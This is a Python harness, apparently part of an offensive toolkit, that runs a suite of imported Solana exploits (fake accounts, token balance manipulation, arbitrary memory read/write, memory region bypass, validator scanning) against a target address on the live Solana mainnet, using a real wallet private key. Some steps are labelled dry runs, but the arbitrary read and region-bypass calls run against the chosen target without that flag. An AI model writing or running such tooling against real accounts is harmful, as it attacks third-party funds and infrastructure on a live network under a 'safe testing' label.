#!/usr/bin/env python3
"""
MAINNET EXPLOIT TESTER
Безопасное тестирование всех эксплойтов на Solana mainnet с использованием реальных настроек

ВНИМАНИЕ: Работа с mainnet! Все операции выполняются с максимальной осторожностью.
"""

import asyncio
import logging
import time
import os
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
import json
from dataclasses import dataclass

from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient
from solana.rpc.commitment import Commitment
from solana.rpc.types import TxOpts

# Импорт наших эксплойтов
from src.exploits import (
    BaseExploit, ExploitResult, ExploitStatus, ExploitType,
    AccountExploit, TokenExploit, ProgramExploit, ReentrancyExploit,
    MemoryExploit, ValidatorExploit,
    ExploitManager
)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('mainnet_exploit_test.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class MainnetConfig:
    """Конфигурация для работы с mainnet"""
    network: str
    rpc_url: str
    private_key: str
    target_address: str
    keypair_path: str
    
    @classmethod
    def from_env(cls) -> 'MainnetConfig':
        """Загрузка конфигурации из переменных окружения"""
        return cls(
            network=os.getenv('SOLANA_NETWORK', 'mainnet'),
            rpc_url=os.getenv('SOLANA_RPC_URL', 'https://api.mainnet.solana.com'),
            private_key=os.getenv('SOLANA_PRIVKEY', ''),
            target_address=os.getenv('SOLANA_TARGET_ADDRESS', ''),
            keypair_path=os.getenv('SOLANA_KEYPAIR_PATH', '~/.config/solana/id.json')
        )

class MainnetExploitTester:
    """
    Тестер эксплойтов для mainnet с повышенными мерами безопасности
    """
    
    def __init__(self, config: MainnetConfig):
        self.config = config
        self.client = AsyncClient(config.rpc_url, commitment=Commitment("confirmed"))
        
        # Создаем keypair из приватного ключа
        if config.private_key:
            # Конвертируем hex строку в bytes
            private_key_bytes = bytes.fromhex(config.private_key)
            self.keypair = Keypair.from_bytes(private_key_bytes)
            logger.info(f"[+] Keypair создан из приватного ключа")
        else:
            # Fallback на файл keypair
            self.keypair = self._load_keypair_from_file(config.keypair_path)
            logger.info(f"[+] Keypair загружен из файла: {config.keypair_path}")
        
        self.target_pubkey = PublicKey.from_string(config.target_address) if config.target_address else None
        
        # Инициализация эксплойтов
        self.exploit_manager = ExploitManager(self.client, self.keypair)
        self.account_exploit = AccountExploit(self.client, self.keypair)
        self.token_exploit = TokenExploit(self.client, self.keypair)
        self.program_exploit = ProgramExploit(self.client, self.keypair)
        self.reentrancy_exploit = ReentrancyExploit(self.client, self.keypair)
        self.memory_exploit = MemoryExploit(self.client, self.keypair)
        self.validator_exploit = ValidatorExploit(self.client, self.keypair)
        
        # Статистика
        self.test_results = {}
        self.total_tests = 0
        self.passed_tests = 0
        self.failed_tests = 0
        
        logger.info(f"[!] MAINNET EXPLOIT TESTER ИНИЦИАЛИЗИРОВАН")
        logger.info(f"    Network: {config.network}")
        logger.info(f"    RPC URL: {config.rpc_url}")
        logger.info(f"    Wallet: {self.keypair.pubkey()}")
        logger.info(f"    Target: {config.target_address}")
        
    def _load_keypair_from_file(self, keypair_path: str) -> Keypair:
        """Загрузка keypair из файла"""
        path = Path(keypair_path).expanduser()
        if not path.exists():
            raise FileNotFoundError(f"Keypair файл не найден: {path}")
        
        with open(path, 'r') as f:
            keypair_data = json.load(f)
        
        return Keypair.from_bytes(bytes(keypair_data))
    
    async def check_wallet_balance(self) -> float:
        """Проверка баланса кошелька"""
        try:
            response = await self.client.get_balance(self.keypair.pubkey())
            balance_lamports = response.value
            balance_sol = balance_lamports / 1_000_000_000  # Конвертация в SOL
            
            logger.info(f"[+] Баланс кошелька: {balance_sol:.9f} SOL ({balance_lamports} lamports)")
            return balance_sol
            
        except Exception as e:
            logger.error(f"[-] Ошибка проверки баланса: {e}")
            return 0.0
    
    async def analyze_target_account(self) -> Dict[str, Any]:
        """Анализ целевого аккаунта"""
        if not self.target_pubkey:
            logger.warning("[!] Целевой аккаунт не указан")
            return {}
        
        try:
            logger.info(f"[*] Анализ целевого аккаунта: {self.target_pubkey}")
            
            # Получаем информацию об аккаунте
            account_info = await self.client.get_account_info(self.target_pubkey)
            
            if not account_info.value:
                logger.warning(f"[-] Аккаунт {self.target_pubkey} не найден")
                return {"exists": False}
            
            account = account_info.value
            analysis = {
                "exists": True,
                "lamports": account.lamports,
                "owner": str(account.owner),
                "executable": account.executable,
                "rent_epoch": account.rent_epoch,
                "data_size": len(account.data) if account.data else 0
            }
            
            logger.info(f"[+] Аккаунт найден:")
            logger.info(f"    Баланс: {account.lamports / 1_000_000_000:.9f} SOL")
            logger.info(f"    Владелец: {account.owner}")
            logger.info(f"    Исполняемый: {account.executable}")
            logger.info(f"    Размер данных: {len(account.data) if account.data else 0} bytes")
            
            return analysis
            
        except Exception as e:
            logger.error(f"[-] Ошибка анализа аккаунта: {e}")
            return {"error": str(e)}
    
    async def test_account_exploits(self) -> Dict[str, Any]:
        """Тестирование эксплойтов аккаунтов"""
        logger.info("[*] ТЕСТИРОВАНИЕ ACCOUNT EXPLOITS")
        
        results = {}
        test_start = time.time()
        
        try:
            # 1. Сканирование уязвимостей аккаунтов
            logger.info("[1/3] Сканирование уязвимостей аккаунтов...")
            
            target_accounts = [self.target_pubkey] if self.target_pubkey else []
            if not target_accounts:
                # Используем системные аккаунты для тестирования
                target_accounts = [
                    PublicKey.from_string("11111111111111111111111111111112"),  # System Program
                    PublicKey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),  # Token Program
                ]
            
            scan_results = await self.account_exploit.scan_account_vulnerabilities(target_accounts)
            results["vulnerability_scan"] = {
                "accounts_scanned": len(target_accounts),
                "vulnerabilities_found": sum(len(vulns) for vulns in scan_results.values()),
                "results": {str(k): [v.value for v in vulns] for k, vulns in scan_results.items()}
            }
            
            # 2. Тест создания поддельного аккаунта (безопасно)
            logger.info("[2/3] Тест создания поддельного аккаунта...")
            fake_account_result = await self.account_exploit.create_fake_account(
                target_account=self.keypair.pubkey(),  # Используем свой аккаунт
                fake_balance=1000000  # 0.001 SOL
            )
            results["fake_account_test"] = {
                "success": fake_account_result.status == ExploitStatus.SUCCESS,
                "execution_time": fake_account_result.execution_time,
                "error": fake_account_result.error_message if fake_account_result.error_message else None
            }
            
            # 3. Тест манипуляции данными аккаунта (только чтение)
            logger.info("[3/3] Тест чтения данных аккаунта...")
            if self.target_pubkey:
                data_manipulation_result = await self.account_exploit.manipulate_account_data(
                    target_account=self.target_pubkey,
                    new_data=b"",  # Пустые данные для безопасности
                    dry_run=True  # Только симуляция
                )
                results["data_manipulation_test"] = {
                    "success": data_manipulation_result.status == ExploitStatus.SUCCESS,
                    "execution_time": data_manipulation_result.execution_time,
                    "data_read": len(data_manipulation_result.leaked_data) if data_manipulation_result.leaked_data else 0
                }
            
            self.total_tests += 3
            self.passed_tests += sum(1 for test in results.values() if test.get("success", False))
            
        except Exception as e:
            logger.error(f"[-] Ошибка в тестировании account exploits: {e}")
            results["error"] = str(e)
        
        results["execution_time"] = time.time() - test_start
        return results
    
    async def test_token_exploits(self) -> Dict[str, Any]:
        """Тестирование эксплойтов токенов"""
        logger.info("[*] ТЕСТИРОВАНИЕ TOKEN EXPLOITS")
        
        results = {}
        test_start = time.time()
        
        try:
            # 1. Сканирование токенов в кошельке
            logger.info("[1/4] Сканирование токенов в кошельке...")
            token_accounts = await self.token_exploit.scan_wallet_tokens(self.keypair.pubkey())
            results["wallet_tokens"] = {
                "tokens_found": len(token_accounts),
                "token_accounts": [str(acc) for acc in token_accounts]
            }
            
            # 2. Анализ уязвимостей токенов
            logger.info("[2/4] Анализ уязвимостей токенов...")
            if token_accounts:
                token_vulns = await self.token_exploit.scan_token_vulnerabilities(token_accounts[:5])  # Первые 5
                results["token_vulnerabilities"] = {
                    "accounts_analyzed": len(token_accounts[:5]),
                    "vulnerabilities": {str(k): [v.value for v in vulns] for k, vulns in token_vulns.items()}
                }
            
            # 3. Тест создания поддельного токена (симуляция)
            logger.info("[3/4] Симуляция создания поддельного токена...")
            fake_token_result = await self.token_exploit.create_fake_token(
                mint_authority=self.keypair.pubkey(),
                initial_supply=1000000,  # 1M токенов
                decimals=6,
                dry_run=True  # Только симуляция
            )
            results["fake_token_test"] = {
                "success": fake_token_result.status == ExploitStatus.SUCCESS,
                "execution_time": fake_token_result.execution_time
            }
            
            # 4. Тест манипуляции балансом (только чтение)
            logger.info("[4/4] Тест чтения балансов токенов...")
            if token_accounts:
                balance_result = await self.token_exploit.manipulate_token_balance(
                    token_account=token_accounts[0],
                    new_balance=0,  # Не изменяем реальный баланс
                    dry_run=True
                )
                results["balance_manipulation_test"] = {
                    "success": balance_result.status == ExploitStatus.SUCCESS,
                    "execution_time": balance_result.execution_time
                }
            
            self.total_tests += 4
            self.passed_tests += sum(1 for test in results.values() if isinstance(test, dict) and test.get("success", False))
            
        except Exception as e:
            logger.error(f"[-] Ошибка в тестировании token exploits: {e}")
            results["error"] = str(e)
        
        results["execution_time"] = time.time() - test_start
        return results
    
    async def test_memory_exploits(self) -> Dict[str, Any]:
        """Тестирование memory corruption эксплойтов"""
        logger.info("[*] ТЕСТИРОВАНИЕ MEMORY EXPLOITS")
        
        results = {}
        test_start = time.time()
        
        try:
            # 1. Сканирование memory уязвимостей
            logger.info("[1/3] Сканирование memory уязвимостей...")
            
            target_accounts = [self.target_pubkey] if self.target_pubkey else [self.keypair.pubkey()]
            memory_scan = await self.memory_exploit.run_comprehensive_memory_scan(target_accounts)
            
            results["memory_scan"] = {
                "accounts_scanned": len(target_accounts),
                "vulnerabilities_found": sum(len(vulns) for vulns in memory_scan.values()),
                "scan_results": {str(k): [v.value for v in vulns] for k, vulns in memory_scan.items()}
            }
            
            # 2. Тест arbitrary read (безопасно)
            logger.info("[2/3] Тест arbitrary read...")
            if self.target_pubkey:
                from src.exploits.memory_exploit import MemoryExploitConfig, MemoryVulnerability
                
                read_config = MemoryExploitConfig(
                    target_account=self.target_pubkey,
                    vulnerability_type=MemoryVulnerability.ARBITRARY_READ_WRITE,
                    target_offset=0,
                    payload_size=64
                )
                
                read_result = await self.memory_exploit.exploit_arbitrary_readwrite(read_config)
                results["arbitrary_read_test"] = {
                    "success": read_result.status == ExploitStatus.SUCCESS,
                    "execution_time": read_result.execution_time,
                    "data_leaked": len(read_result.leaked_data) if read_result.leaked_data else 0
                }
            
            # 3. Тест memory region bypass (симуляция)
            logger.info("[3/3] Тест memory region bypass...")
            if self.target_pubkey:
                bypass_config = MemoryExploitConfig(
                    target_account=self.target_pubkey,
                    vulnerability_type=MemoryVulnerability.MEMORY_REGION_BYPASS,
                    target_offset=0,
                    payload_size=32
                )
                
                bypass_result = await self.memory_exploit.exploit_memory_region_bypass(bypass_config)
                results["memory_bypass_test"] = {
                    "success": bypass_result.status == ExploitStatus.SUCCESS,
                    "execution_time": bypass_result.execution_time
                }
            
            self.total_tests += 3
            self.passed_tests += sum(1 for test in results.values() if isinstance(test, dict) and test.get("success", False))
            
        except Exception as e:
            logger.error(f"[-] Ошибка в тестировании memory exploits: {e}")
            results["error"] = str(e)
        
        results["execution_time"] = time.time() - test_start
        return results
    
    async def test_validator_exploits(self) -> Dict[str, Any]:
        """Тестирование validator эксплойтов (только сканирование)"""
        logger.info("[*] ТЕСТИРОВАНИЕ VALIDATOR EXPLOITS (ТОЛЬКО СКАНИРОВАНИЕ)")
        
        results = {}
        test_start = time.time()
        
        try:
            # Только безопасное сканирование validator'ов
            logger.info("[1/1] Сканирование validator уязвимостей...")
            
            validator_endpoints = [self.config.rpc_url]
            validator_scan = await self.validator_exploit.run_comprehensive_validator_scan(validator_endpoints)
            
            results["validator_scan"] = {
                "endpoints_scanned": len(validator_endpoints),
                "vulnerabilities_found": sum(len(vulns) for vulns in validator_scan.values()),
                "scan_results": {k: [v.value for v in vulns] for k, vulns in validator_scan.items()}
            }
            
            self.total_tests += 1
            self.passed_tests += 1 if results["validator_scan"]["vulnerabilities_found"] >= 0 else 0
            
        except Exception as e:
            logger.error(f"[-] Ошибка в тестировании validator exploits: {e}")
            results["error"] = str(e)
        
        results["execution_time"] = time.time() - test_start
        return results
    
    async def run_comprehensive_test_suite(self) -> Dict[str, Any]:
        """Запуск полного набора тестов"""
        logger.info("=" * 80)
        logger.info("[!] ЗАПУСК ПОЛНОГО НАБОРА ТЕСТОВ ЭКСПЛОЙТОВ НА MAINNET")
        logger.info("=" * 80)
        
        suite_start = time.time()
        comprehensive_results = {}
        
        # Проверка баланса
        balance = await self.check_wallet_balance()
        if balance < 0.001:  # Минимум 0.001 SOL для тестов
            logger.warning(f"[!] Низкий баланс: {balance:.9f} SOL. Некоторые тесты могут не работать.")
        
        # Анализ целевого аккаунта
        target_analysis = await self.analyze_target_account()
        comprehensive_results["target_analysis"] = target_analysis
        
        # Тестирование эксплойтов по категориям
        comprehensive_results["account_exploits"] = await self.test_account_exploits()
        comprehensive_results["token_exploits"] = await self.test_token_exploits()
        comprehensive_results["memory_exploits"] = await self.test_memory_exploits()
        comprehensive_results["validator_exploits"] = await self.test_validator_exploits()
        
        # Финальная статистика
        total_time = time.time() - suite_start
        success_rate = (self.passed_tests / self.total_tests * 100) if self.total_tests > 0 else 0
        
        comprehensive_results["final_stats"] = {
            "total_tests": self.total_tests,
            "passed_tests": self.passed_tests,
            "failed_tests": self.failed_tests,
            "success_rate": success_rate,
            "total_execution_time": total_time,
            "wallet_balance": balance,
            "network": self.config.network,
            "rpc_url": self.config.rpc_url
        }
        
        logger.info("=" * 80)
        logger.info("[=] ФИНАЛЬНАЯ СТАТИСТИКА ТЕСТИРОВАНИЯ")
        logger.info(f"[+] Всего тестов: {self.total_tests}")
        logger.info(f"[+] Успешных: {self.passed_tests}")
        logger.info(f"[+] Неудачных: {self.failed_tests}")
        logger.info(f"[%] Процент успеха: {success_rate:.1f}%")
        logger.info(f"[T] Время выполнения: {total_time:.2f}s")
        logger.info(f"[W] Баланс кошелька: {balance:.9f} SOL")
        logger.info("=" * 80)
        
        return comprehensive_results
    
    async def save_test_report(self, results: Dict[str, Any]):
        """Сохранение отчета о тестировании"""
        report_path = Path(__file__).parent / "mainnet_test_report.json"
        
        report = {
            "metadata": {
                "timestamp": time.time(),
                "network": self.config.network,
                "rpc_url": self.config.rpc_url,
                "wallet_pubkey": str(self.keypair.pubkey()),
                "target_address": self.config.target_address,
                "test_type": "mainnet_exploit_testing"
            },
            "results": results
        }
        
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        
        logger.info(f"[+] Отчет сохранен: {report_path}")
    
    async def close(self):
        """Закрытие соединений"""
        await self.client.close()

async def main():
    """Главная функция"""
    print("[!] MAINNET EXPLOIT TESTER")
    print("    Безопасное тестирование эксплойтов на Solana mainnet")
    print()
    
    # Загрузка конфигурации
    config = MainnetConfig.from_env()
    
    if not config.private_key and not Path(config.keypair_path).expanduser().exists():
        print("[-] Ошибка: Не найден приватный ключ или файл keypair!")
        return
    
    if not config.target_address:
        print("[!] Предупреждение: Целевой адрес не указан. Будут использованы системные аккаунты.")
    
    # Инициализация тестера
    tester = MainnetExploitTester(config)
    
    try:
        # Запуск тестов
        results = await tester.run_comprehensive_test_suite()
        
        # Сохранение отчета
        await tester.save_test_report(results)
        
        print("\n[+] Тестирование завершено успешно!")
        print(f"[+] Отчет сохранен в mainnet_test_report.json")
        
    except Exception as e:
        logger.error(f"[-] Критическая ошибка: {e}")
        raise
    
    finally:
        await tester.close()

if __name__ == "__main__":
    asyncio.run(main())
